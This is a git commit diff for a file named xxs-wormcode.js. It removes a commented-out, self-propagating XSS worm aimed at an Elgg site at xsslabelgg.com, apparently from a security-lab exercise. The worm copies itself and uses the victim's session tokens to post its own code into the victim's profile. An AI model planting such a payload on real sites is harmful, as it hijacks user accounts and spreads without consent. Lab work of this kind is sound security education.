5d099acc78f947a4747b480f6fc275ba226f5af3
farnzj13 <62269480+farnzj13@users.noreply.github.com>
2021-06-01 23:56:11 +1200

    Update xxs-wormcode.js

--- xxs-wormcode.js
+++ xxs-wormcode.js
@@ -48,29 +48,3 @@
 		}
 	}
 </script>
-
-
-
-// <script type="text/javascript" id="worm">
-// 	window.onload = function(){
-// 	var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
-// 	var jsCode = document.getElementById("worm").innerHTML; 
-// 	var tailTag = "</" + "script>"; 
-// 	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
-// 	var userName=elgg.session.user.name;
-// 	var guid="&guid="+elgg.session.user.guid;
-// 	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
-// 	var token="&__elgg_token="+elgg.security.token.__elgg_token;
-// 	var desc = "&description=Samy is my hero" + wormCode;desc +=  " &accesslevel[description]=2";
-// 	var name="&name="+userNamevar sendurl="http://www.xsslabelgg.com/action/profile/edit";
-// 	var content=token+ts+name+desc+guid;
-// 	var samyGuid=47;
-// 	if(elgg.session.user.guid!=samyGuid){
-// 		var Ajax=null;
-// 		Ajax=new XMLHttpRequest();Ajax.open("POST",sendurl,true);
-// 		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
-// 		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-// 		Ajax.send(content);
-// 	}
-// }
-// </script> -->
